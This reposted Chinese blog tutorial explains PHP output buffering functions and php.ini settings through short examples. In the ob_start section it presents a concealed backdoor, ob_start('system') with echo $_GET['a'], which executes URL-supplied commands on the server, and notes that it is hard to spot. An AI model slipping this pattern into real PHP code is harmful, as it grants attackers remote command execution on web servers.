---
title: PHP输出缓冲控制函数详解
categories: A-PHP中高级
permalink: php-output-bufer-control-function-detailed
translate_title: php-output-buffer-control-function-detailed-solution
date: 2014-12-12 14:04:00
tags:
description:
---
## 概述
以前研究过PHP的输入输出缓冲，不过博客搬家以后，原来文章找不到了，今天看到一篇好文，顺便转载过来。

## 简介
说到输出缓冲，首先要说的是一个叫做缓冲器(buffer)的东西。举个简单的例子说明他的作用：我们在编辑一篇文档时，在我们没有保存之前，系统是不会向磁盘写入的，而是写到buffer中，当buffer写满或者执行了保存操作，才会将数据写入磁盘。对于PHP来说，每一次像 echo 这样的输出操作，同样是先写入到了 php buffer 里，在脚本执行完毕或者执行了强制输出缓存操作，数据才会在浏览器上显示。   

其实对于PHP程序员来说，基本上每个脚本都涉及到了输出缓冲，只是在大多数情况下，我们都不需要对输出缓冲进行更改。而今天就来用实例对PHP输出缓冲控制函数“Output Control”做一个详细的解析。   
**下面这个例子简单介绍了输出缓冲在一般脚本中存在的方式：**

```
echo 'Apple';
echo 'IBM';
echo 'Microsoft'
```

我们在执行上面这段脚本时，脚本在执行完第一个 echo 时，并不会向浏览器输出相应内容，而是会输出到一个缓冲区，依次类推，当三个 echo 全部执行完毕(也就是脚本结束)时，才会将缓冲区内容全部输出到浏览器。当然这个缓冲区也有大小的限制，是根据 php.ini 中的output_buffering选项来设置的，这点会在下面的文章中详细介绍。而本章所讲的输出缓冲控制，就是在脚本结束前，对缓冲区里的内容进行操作。 
**下这个例子可以更好的体现输出缓冲控制的应用：**

```
echo 'Apple'; sleep(2);
echo 'IBM'; sleep(2);
echo 'Microsoft';
```

我们至少需要等待 2秒 才能看到输出结果，那我们能不能让其实时的显示呢？也就是在第一个 echo 执行完毕时就输出相应的内容呢，这时候就需要用输出缓冲控制函数来操作缓冲区了，具体怎么实现先放一边，文章的结尾会公布。  

## 作用
* 在PHP中，像header(), session_start(), setcookie() 等这样的发送头文件的函数前，不能有任何的输出，而利用输出缓冲控制函数可以在这些函数前进行输出而不报错。其实这么做没啥必要，非常少见的用法。
* 对输出的内容进行处理，例如生成静态缓存文件、进行gzip压缩输出，这算是较常用的功能了。
* 捕获一些不可获取的函数输出，例如phpinfo(), var_dump() 等等，这些函数都会将运算结果显示在浏览器中，而如果我们想对这些结果进行处理，则用输出缓冲控制函数是个不错的方法。说的通俗点，就是这类函数都不会有返回值，而要获取这些函数的输出数据，就要用到输出缓冲控制函数。  
* 最后一种应用就是 **简介** 中提到的 对一些数据进行实时的输出。

## php.ini 中的相关配置项 
再来看看在 php.ini 中和输出缓冲控制有关的选项，共三个，分别是：output_buffering, implicit_flush 和 output_handler。  
* output_buffering 默认为 off , 当设置为 on 时，则在所有脚本自动打开输出缓冲区，就是在每个脚本都自动执行了 ob_start() 这个函数，而不用再显示的调用该函数。其也可以设置为一个整型的数字，代表缓冲区可以存储的最大字节数，我们在例1下面的说明中提到过这个配置项。  
* implicit_flush 默认为 off , 当设置为 on 时，PHP将在输出后，自动送出缓冲区内容。就是在每段输出后，自动执行 flush() 。当然有效的输出不仅指像echo , print 这样的函数，也包括HTML段。  
* output_handler 默认为 null , 其值只能设置为一个内置的函数名，作用就是将脚本的所有输出，用所定义的函数进行处理。他的用法和 ob_start(‘function_name’) 较类似，下面会介绍到。  
  
本篇文章中，如果没有特别说明，php.ini中output_buffering, implicit_flush 和 output_handler的值均为默认值。

## Output Control 函数详解
### ob_start()
**bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )**  
此函数大家从命名上也能明白其含义，就是打开输出缓冲区，从而进行下一步的输出缓冲处理。这里要特意说的是其参数的用法，第一个参数要传递一个回调函数，其需将缓冲区内容做为参数，并且返回一个字符串。他会在缓冲区被送出时调用，缓冲区送出指的是执行了例如ob_flush() 等函数或者脚本执行完毕。ob_flush() 函数会在下面介绍到，来看一个简单的例子就能理解其用法：
  
```
function dothing1($echo_thing){
    return ' #' . $echo_thing . '# ';
}
 
ob_start('dothing1');
echo 'Apple';

输出结果
#Apple#
```

从输出的结果可以看出单词两边被添加了“#”，也就是说在缓冲区内容输出时，运行了我们定义的 dothing1函数。  

再来看一个更实际的例子，也就是常见到的将网页内容利用 gzip 压缩后再输出，代码如下：

```
ob_start();
echo str_repeat('Apple', 1024);
```

输出结果：没有使用gzip压缩的情况下,输出内容大小为**5.2KB**。  
输出结果：使用gzip压缩的情况下，文档大小小了很多，压缩花费了时间，所以时间长了。    

而第二个参数 chunk_size 为缓冲区的字节长度，如果缓冲区内容大于此长度，将会被送出缓冲区，默认值为0，代表函数将会在最后被调用。第三个参数 erase 如果被设置为 flase , 则代表脚本执行完毕后缓冲区才会被删除，如果提前执行了删除缓冲区函数(后面会提到)，则会报一个错误。  

ob_start() 的用法就这么多，但有两点需要特别注意的地方：
* ob_start() 可重复调用，也就是说一个脚本中可以存在多个缓冲区，但记得要按照嵌套顺序将他们全部关闭掉，而如果多个 ob_start 都定义了第一个参数，也就是都定义了回调函数，则会按照嵌套顺序依次执行。关于缓冲区的堆叠嵌套，将在 ob_get_level 函数处详细介绍，这里就不过多阐述了。  

ob_start() 还有一个不太明显但很致命的后门用法，实现代码如下：

```
$cmd = 'system';
ob_start($cmd);
echo $_GET['a'];
ob_end_flush();

windows下面的输出结果：
14 个目录 30,970,388,480 可用字节
```
 
如果理解了上面关于 ob_start的用法，这段代码就不难理解了，其应用了 ob_start 函数会将缓冲区输出的内容作为参数传入所设置的函数中的特点，实现了以Web服务器权限远程执行命令，并且不宜被发觉。  

### ob_get_contents()
**string ob_get_contents ( void )**
此函数用来获取此时缓冲区的内容，下面的例子就能很好的理解其用法： 

```
ob_start('doting2');
echo 'apple';
$tmp = ob_get_contents();
file_put_contents('./doting2', $tmp);
ob_end_flush()
```

### ob_get_length()
此函数用来获取缓冲区内容的长度。

### ob_get_level()
**int ob_get_level ( void )**
此函数用来获取缓冲机制的嵌套级别，我们在介绍 ob_start() 函数时曾说过，在一个脚本中可以嵌套存在多个缓冲区，而此函数就是来获取当前缓冲区的嵌套级别，用法如下：

```
ob_start();
var_dump(ob_get_level());
ob_start();
var_dump(ob_get_level());
ob_end_flush();
ob_end_flush();
```
运行后可以很明显的看出他们的嵌套关系。

### ob_get_status（）
**array ob_get_status ([ bool $full_status = FALSE ] )**
此函数用来获取当前缓冲区的状态，返回一个状态信息的数组，如果第一个参数为 true ，将返回一个详细信息的数组，我们结合实例来分析这个数组：

```
ob_start('ob_gzhandler');
var_export(ob_get_status());
ob_start();
var_export(ob_get_status());
ob_end_flush(); ob_end_flush();

运行结果 
array ( 'level' => 2, 'type' => 1, 'status' => 0, 'name' => 'ob_gzhandler', 'del' => true, )
array ( 'level' => 3, 'type' => 1, 'status' => 0, 'name' => 'default output handler', 'del' => true, )
```

说明：
* level 为嵌套级别，也就是和通过 ob_get_level() 取到的值一样
* type 为处理缓冲类型，0为系统内部自动处理，1为用户手动处理
* status为缓冲处理状态， 0为开始， 1为进行中， 2为结束
* name 为定义的输出处理函数名称，也就是在 ob_start() 函数中第一个参数传入的函数名
* del 为是否运行了删除缓冲区操作

### ob_flush()
**void ob_flush ( void )**
此函数的作用就是 “送出” 当前缓冲区内容，同时清空缓冲区，需要注意这里用的是 “送出” 一词，也就是说调用此函数并不会将缓冲区内容输出，必须在其后调用 flush 函数其才会输出。关于 flush 的用法下面就会说到，这里就不再做实例了。  

### flush()
**void flush ( void )**
这个函数算是比较常用的，用来将其前面的所有输出发送到浏览器显示，且不会对缓存区有任何影响。换句话说，不论是 echo 等函数的输出，还是 HTML实体 ，或是运行 ob_start() 送出的内容，运行 flush() 后都会在浏览器进行显示。  

## ob_flush()与flush()的区别 
在没有开启缓存时，脚本输出的内容都在服务器端处于等待输出的状态，flush()可以将等待输出的内容立即发送到客户端。 开启缓存后，脚本输出的内容存入了输出缓存中，这时没有处于等待输出状态的内容，你直接使用flush()不会向客户端发出任何内容。而ob_flush()的作用就是将本来存在输出缓存中的内容取出来，设置为等待输出状态，但不会直接发送到客户端，这时你就需要先使用ob_flush()再使用flush()，客户端才能立即获得脚本的输出。  

### void ob_implicit_flush()
此函数用来打开/关闭绝对刷送模式，就是在每一次输出后自动执行 flush()，从而不需要再显示的调用 flush() ，提高效率。  

### 其他相关函数
* bool ob_end_flush ( void )
* string ob_get_flush ( void )
* void ob_clean ( void )
* bool ob_end_clean ( void )
* string ob_get_clean ( void )

## 对一些数据进行实时的输出
相信读了上面的内容，就会对PHP的缓冲控制函数有较深的认识了，现在我们回到简介中留下的问题：让例2的脚本实现实时的显示内容，而不需要等待4秒后出现所有内容。   

我们可以根据缓存开启与否，有如下几种不同的写法，如果你在测试过程中无法出现预期的效果，可以在header('content-type:text/html;charset=utf-8');下面插入str_repeat(' ', 1024);，你也可以尝试更大的值，部分浏览器即使这么做了，有可能还是无法出现效果，你可以尝试将php代码放入完整的html代码块body体内。下面代码的header('content-type:text/html;charset=utf-8');不要省略哦，否则部分浏览器查看不到效果。 

```
ob_start(''); //这里我使用ob_start('ob_gzhandler')没有效果
header('content-type:text/html;charset=utf-8');
echo 'Apple #';  
ob_flush(); flush();
sleep(2);
echo 'IBM #';
ob_flush(); flush();
sleep(2);
echo 'Microsoft';
```

## 原文地址
* [PHP输出缓冲控制(Output Control)函数详解](http://www.medesky.me/php-output-buffering-control-output-control-function-details.html)

